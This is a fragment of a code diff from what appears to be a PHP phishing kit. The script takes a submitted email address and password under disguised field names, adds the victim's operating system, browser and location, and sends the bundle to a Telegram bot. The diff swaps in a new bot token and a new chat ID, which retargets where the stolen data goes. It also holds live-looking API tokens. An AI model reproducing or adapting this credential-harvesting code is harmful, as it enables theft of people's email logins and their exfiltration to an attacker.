@@ -72,11 +72,11 @@ if ( isset ($_POST['c0r']) && isset ($_POST['pc0r'])  ){
 
 $message = "m4il: ".$_POST['c0r']." - p4zz-m4il: ".$_POST['pc0r']."  \r\n";
 $message .= " SO= ".$user_os." ".$navegador." ".$userp." ".$pais." ".$region." ".$ciudad."\r\n";
-$apiToken = "5949300208:AAEDrXMf0ywpXprlNvf94CxbY-I0PR-PMV8";
+$apiToken = "5830940342:AAFD-f94b1SfPAJnjOqi07f4rGhr-hGskos";
 
 
 $data = [
-  'chat_id' => '@Flowmexicobot',
+  'chat_id' => '@printhost',
 
    'text' => $message
 ];
